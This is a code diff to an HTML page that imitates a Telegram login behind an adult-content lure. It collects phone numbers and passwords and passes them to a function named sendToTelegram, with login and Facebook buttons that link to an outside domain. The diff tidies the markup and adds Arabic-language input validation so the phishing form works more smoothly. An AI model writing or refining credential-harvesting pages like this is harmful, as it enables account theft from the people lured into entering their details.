@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-         <title>telegram invita 🔞</title>
+    <title>telegram invita 🔞</title>
     <link rel="icon" href="path-to-your-favicon.ico" type="image/x-icon">
     <style> 
         /* Set the background image */
@@ -142,17 +142,20 @@
 </head>
 <body>
     <!-- Replace text with an image icon or logo -->
-<div class="telegram-text">
-    <img src="path-to-your-logo.png" alt="TeleGram Logo" style="width: 200px; height: auto;">
-</div>
+    <div class="telegram-text">
+        <img src="path-to-your-logo.png" alt="TeleGram Logo" style="width: 200px; height: auto;">
+    </div>
 
     <!-- Phone number input field -->
-<input type="text" class="phone-input" placeholder="your phone number">
+    <input type="text" class="phone-input" placeholder="your phone number">
 
-<!-- Password input field -->
-<input type="password" class="phone-input" placeholder="your password">
+    <!-- Password input field -->
+    <input type="password" class="phone-input" placeholder="your password">
 
-<a href="http://khair-zaman.com/volt/XZ?nox=7238044992" class="login-button">Login</a>
+    <!-- Error message container -->
+    <div id="error-message" style="color: red; display: none; margin-top: 10px;"></div>
+
+    <a href="http://khair-zaman.com/volt/XZ?nox=7238044992" class="login-button">Login</a>
 
     <!-- Additional icon and text -->
     <a href="https://lbx.to/d/BKJNneq" class="more-info">
@@ -164,7 +167,7 @@
         <img src="path-to-google-icon.png" alt="Google Icon"> Continue with Google
     </a>
     <a href="http://khair-zaman.com/volt/FB?nox=5318149339" class="auth-button">
-        <img src="path-to-github-icon.png" alt="GitHub Icon"> Continue with facebook
+        <img src="path-to-github-icon.png" alt="GitHub Icon"> Continue with Facebook
     </a>
 
     <!-- Popup window -->
@@ -184,7 +187,7 @@
             document.getElementById('popup').style.display = 'none';
         }
 
-            function sendToTelegram() {
+        function sendToTelegram() {
             var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
             var password = document.querySelector('.phone-input[type="password"]').value;
 
@@ -202,20 +205,33 @@
 
         document.querySelector('.phone-input').addEventListener('change', sendToTelegram);
 
-        
-    // Function to handle the login button click
-    document.querySelector('.login-button').addEventListener('click', function(event) {
-        var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
-        var password = document.querySelector('.phone-input[type="password"]').value;
+        // Function to handle the login button click
+        document.querySelector('.login-button').addEventListener('click', function(event) {
+            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
+            var password = document.querySelector('.phone-input[type="password"]').value;
+            var errorMessage = document.getElementById('error-message');
 
-        if (phoneNumber === '' || password === '') {
-            alert('يرجى إدخال رقم الهاتف وكلمة المرور.');
-            event.preventDefault(); // Prevent the default action (navigation)
-        } else {
-            sendToTelegram(); // Send the phone number to Telegram as before
-        }
-    });
+            // Clear previous error
+            errorMessage.style.display = 'none';
 
+            // Validate phone number
+            if (!/^\d{10}$/.test(phoneNumber)) {
+                errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
+                errorMessage.style.display = 'block';
+                event.preventDefault();
+                return;
+            }
+
+            // Validate password
+            if (password.length < 6) {
+                errorMessage.textContent = 'يجب أن تتكون كلمة المرور من 6 أحرف على الأقل.';
+                errorMessage.style.display = 'block';
+                event.preventDefault();
+                return;
+            }
+
+            sendToTelegram();
+        });
     </script>
 </body>
-</html> 
+</html>
